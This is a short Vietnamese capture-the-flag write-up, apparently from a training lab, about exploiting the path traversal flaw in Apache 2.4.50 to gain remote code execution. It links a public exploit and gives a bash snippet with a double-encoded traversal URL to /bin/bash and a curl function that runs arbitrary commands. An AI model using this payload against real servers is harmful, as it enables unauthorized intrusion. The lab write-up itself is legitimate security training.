



![[Pasted image 20261020171945.png]]
Website chỉ bao gồm 1 file static.
![[Pasted image 20261023105525.png]]

Mình đọc response thì server dùng Apache 2.4.50, mình còn để ý thấy Last-Modified là 2007 nên mình khá nghi rằng mình sẽ phải khai thác lỗ hỏng ở phiên bản cũ ..?

Mình lên mạng thử một số PoC:...
![[Pasted image 20261020171934.png]]


Đến khi thử https://github.com/CalfCrusher/Path-traversal-RCE-Apache-2.4.49-2.4.50-Exploit thì thành công:

![[Pasted image 20261023105758.png]]


Thế là mình copy payload và chạy RCE:

```bash
export TARGET="https://web-opensource-is-the-best-0-5-17dcd4e3e617.training.bksec.vn:1337/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/bash"

rce() {
    curl -s --path-as-is -X POST \
      -H "Content-Type: text/plain" \
      --data "echo Content-Type: text/plain; echo; $1" \
      "$TARGET"
}
```
![[Pasted image 20261023110031.png]]

![[Pasted image 20261023110107.png]]